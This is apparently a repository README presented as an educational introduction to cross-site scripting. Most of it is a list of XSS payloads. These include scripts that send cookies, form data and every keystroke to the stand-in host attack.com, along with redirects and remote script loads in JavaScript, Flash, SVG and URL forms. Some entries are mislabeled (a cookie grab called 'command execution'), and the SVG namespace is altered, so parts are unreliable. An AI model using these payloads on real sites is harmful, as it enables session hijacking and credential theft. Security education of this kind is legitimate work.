<p align="center"><img align="center" width="500" height="500" src="./assets/Cross-site-scripting.gif"/></p>

# Cross-site Scripting
Before we start talking about Cross-site-scripting, I'd like to say that this repository is for educational purposes only, so that you can understand how this vulnerability works and how to avoid future problems with XSS.
### Web application
Basically, a web application is a piece of software that runs in a web browser, such as Chrome, Firefox etc. Why understand what a web application is? precisely because Cross-site-scripting (XSS) is caused by flaws in web applications themselves. Like Facebook, Olx etc. 

<code> You can learn more about web application here: https://aws.amazon.com/what-is/web-application/ </code>
### Vulnerability
Vulnerability is precisely a weakness in a web application that is exploited through bugs or the structure of the web application itself, if it has flaws, and it is in these flaws that people with malicious intentions can gain access to sensitive and important data.

<code>You can learn more about vulnerabilities here: https://owasp.org/www-community/vulnerabilities/.</code>
#### XSS
**Cross-site scripting** or **XSS** is an injection attack frequently based on JavaScript, but it can also include HTML or any type of code that our browser can execute. They inject into a web application with the focus of being executed by other users. In this way, it can send malicious code to other people who may mistakenly click on a script that captures sensitive or important information. 


### Payloads
Payloads are basically Javascript codes that we can execute on target users' computers.

Examples of payloads with **JavaScript**:

```javascript
Basic Alert Payload:
<script>alert("XSS")</script>


Redirection Payload:
<script>
    window.location.href="http://attack.com"
</script>


Form Data Capture Payload:
<script>
    document.location="http://attack.com/logger.php?data=" +    
    document.getElementById("form_id").value 
</script>

Keylogger Payload:
<script>
    document.onkeypress=function(e){
        fetch("http://www.attack.com/logger.php?k="+ e.key);
    }
</script>

AJAX Command Execution Payload:
<script>
    fetch("http://www.attack.com/log.php?data="+
    document.cookie);
</script>

```

Examples of payloads with **Flash**:
```javascript

Javascript Execution Payload:
<object data="http://www.attack.com/flash.swf"></object>

Redirection Payload (inside a .swf file):
getURL("javascript:window.location.href='http://attack.com'");

Remote Code Execution Payload (inside a .swf file):
load("http://www.attack.com/exploit.js");

```
Example of payload with **SVG**:
```javascript
SVG Payload:
<svg onload="alert('XSS')"></svg>


Alert Execution Payload:
<svg xmlns="http://www.one.site.org/1999/svg" onload="alert('XSS')"></svg>


Malicious Image Inclusion Payload:
<svg xmlns="http://www.one.site.org/1999/svg">
<image xlink:href="http://www.attack.com/malicious-image.jpg"/>
</svg>


Script Inclusion Payload in Mouseover Event:
<svg xmlns="http://www.one.site.org/1999/svg" width="300" height="200">
    <rect width="100%" height="100%" fill="white"/>
    <script type="text/javascript">
        alert('XSS');
    </script>
</svg>


Text Script Inclusion Payload:
<svg xmlns="http://www.one.site.org/1999/svg">
    <text font-family="Arial" font-size="20" x="0"
     y="20" fill="red">
        SVG XSS Example
     </text>
    <script type="text/javascript">
        alert('XSS');
    </script>
</svg>


Script Inclusion Payload in Links (with base64):
<svg xmlns="http://www.one.site.org/1999/svg" xmlns:xlink="http://www.one.site.org/1999/xlink">
<a xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="> 
    Click me
</a>
</svg>

<svg xmlnx="http://www.one.site.org/1999/svg">
    <style>
    circle { fill: red;}
    .xss {color: red;}
    .xss {background-image: url("javascript:alert('XSS')");}
    </style>
</svg>
```
Examples of payloads with **URL**:
```javascript
Script Inclusion Payload in Query String:
http://www.target.com/search?query=<script>alert('XSS')</script>


Script Inclusion Payload in GET Parameters:
http://www.target.com/page?name=<script>alert('XSS')</script>


Script Inclusion Payload in Post Parameters:
POST /page HTTP/1.1
Host: www.target.com
Content-Type: application/x-www-form-urlencoded

name=<script>alert('XSS')</script>


Script Inclusion Payload in Hash Parameters:
http://www.target.com/page#<script>alert('XSS')</script>


Script Inclusion Payload in Reference Parameters:
http://www.target.com/page?ref=<script>alert('XSS')</script>


Script Inclusion Payload in Event Attributes:
<a href="javascript:alert('XSS')"> 
    Click Here
</a>

Script Inclusion Payload in HTTP Redirection:
Location: javascript:alert('XSS');


Script Inclusion Payload in Style Links:
<link rel="stylesheet" href="javascript:alert('XSS');">


Script Inclusion Payload in HREF Attribute:
<a href="javascript:alert('XSS')">
    Click here
</a>
```

